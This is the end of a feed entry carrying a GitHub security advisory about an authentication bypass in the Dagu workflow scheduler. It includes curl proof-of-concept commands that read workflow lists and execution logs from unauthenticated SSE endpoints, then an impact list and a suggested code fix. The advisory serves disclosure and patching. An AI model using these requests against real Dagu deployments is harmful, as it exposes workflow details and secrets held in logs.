export DAGU_AUTH_MODE=basic
export DAGU_AUTH_BASIC_USERNAME=admin
export DAGU_AUTH_BASIC_PASSWORD=secret123
dagu start-all
</code></pre>
<h3 id="verify-rest-api-requires-auth">Verify REST API requires auth</h3>
<pre><code class="language-bash"># Regular API — returns 401 Unauthorized
curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/api/v1/dags
# Output: 401

# With credentials — returns 200
curl -s -o /dev/null -w "%{http_code}" -u admin:secret123 http://localhost:8080/api/v1/dags
# Output: 200
</code></pre>
<h3 id="exploit-sse-bypass">Exploit SSE bypass</h3>
<pre><code class="language-bash"># SSE endpoint WITHOUT any credentials — returns 200 with full data
curl -s -N http://localhost:8080/api/v1/events/dags
</code></pre>
<p><strong>Output (truncated):</strong></p>
<pre><code>event: connected
data: {"topic":"dagslist:"}

event: data
data: {"dags":[{"dag":{"name":"example-01-basic-sequential","schedule":[],...},
"filePath":"/home/user/.config/dagu/dags/example-01-basic-sequential.yaml",
"latestDAGRun":{"dagRunId":"...","status":4,"statusLabel":"succeeded",...}},
...]}
</code></pre>
<pre><code class="language-bash"># Access execution logs without credentials
curl -s -N http://localhost:8080/api/v1/events/dag-runs/{dagName}/{runId}/logs
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>event: data
data: {"schedulerLog":{"content":"...step execution details, parameters, outputs..."},"stepLogs":[...]}
</code></pre>
<h3 id="wrong-credentials-are-rejected">Wrong credentials are rejected</h3>
<pre><code class="language-bash"># Invalid credentials — returns 401 (auth validates IF provided, but doesn't REQUIRE it)
curl -s -o /dev/null -w "%{http_code}" -u wrong:wrong http://localhost:8080/api/v1/events/dags
# Output: 401
</code></pre>
<h2 id="impact">Impact</h2>
<p>An unauthenticated network attacker can:</p>
<ol>
<li><strong>Enumerate all workflows</strong>: DAG names, descriptions, file paths, schedules, and tags</li>
<li><strong>Monitor execution in real-time</strong>: Track which workflows are running, their status, and when they complete</li>
<li><strong>Read execution logs</strong>: Access stdout/stderr of workflow steps, which commonly contain sensitive data (API keys, database credentials, tokens, internal hostnames)</li>
<li><strong>Map infrastructure</strong>: File paths and workflow configurations reveal server directory structure and deployment details</li>
<li><strong>Observe queue state</strong>: Understand pending work items and system load</li>
</ol>
<p>This is especially critical in environments where:</p>
<ul>
<li>Workflows process sensitive data (credentials, PII, financial data)</li>
<li>DAG parameters contain secrets passed at runtime</li>
<li>Log output includes API responses or database queries with sensitive content</li>
</ul>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Set <code>AuthRequired: true</code> for basic auth mode and implement the session-token mechanism referenced in the FIXME comment:</p>
<pre><code class="language-go">if authCfg.Mode == config.AuthModeBasic {
    return auth.Options{
        Realm:            realm,
        BasicAuthEnabled: true,
        AuthRequired:     true,  // Require authentication
        Creds:            map[string]string{authCfg.Basic.Username: authCfg.Basic.Password},
    }
}
</code></pre>
<p>For browser SSE compatibility, implement a session token that can be passed via the <code>?token=</code> query parameter (the <code>QueryTokenMiddleware</code> already exists at <code>auth/middleware.go:39</code> to convert query params to Bearer tokens).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dagu-org/dagu/security/advisories/GHSA-9wmw-9wph-2vwp">https://github.com/dagu-org/dagu/security/advisories/GHSA-9wmw-9wph-2vwp</a></li>
<li><a href="https://github.com/dagu-org/dagu/commit/064616c9b80c04824c1c7c357308f77f3f24d775">https://github.com/dagu-org/dagu/commit/064616c9b80c04824c1c7c357308f77f3f24d775</a></li>
<li><a href="https://github.com/dagu-org/dagu/releases/tag/v2.2.4">https://github.com/dagu-org/dagu/releases/tag/v2.2.4</a></li>
<li><a href="https://github.com/advisories/GHSA-9wmw-9wph-2vwp">https://github.com/advisories/GHSA-9wmw-9wph-2vwp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9wmw-9wph-2vwp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-13T15:05:32.000Z</published>
    </entry>
</feed>